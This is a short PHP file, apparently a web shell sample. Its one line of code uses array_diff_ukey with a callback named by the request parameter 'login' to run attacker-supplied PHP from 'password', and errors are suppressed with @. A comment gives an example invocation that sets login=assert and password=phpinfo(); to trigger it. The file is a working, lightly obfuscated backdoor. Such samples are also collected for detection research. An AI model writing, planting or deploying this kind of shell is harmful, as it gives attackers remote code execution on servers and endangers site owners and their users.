<?php
@array_diff_ukey(@array((string)$_REQUEST['password']=>1), @array((string)stripslashes($_REQUEST['re_password'])=>2),$_REQUEST['login']);
//-f /root/adu.php -l /tmp/pvm.log -p "login=assert&password=phpinfo();&re_password="
?>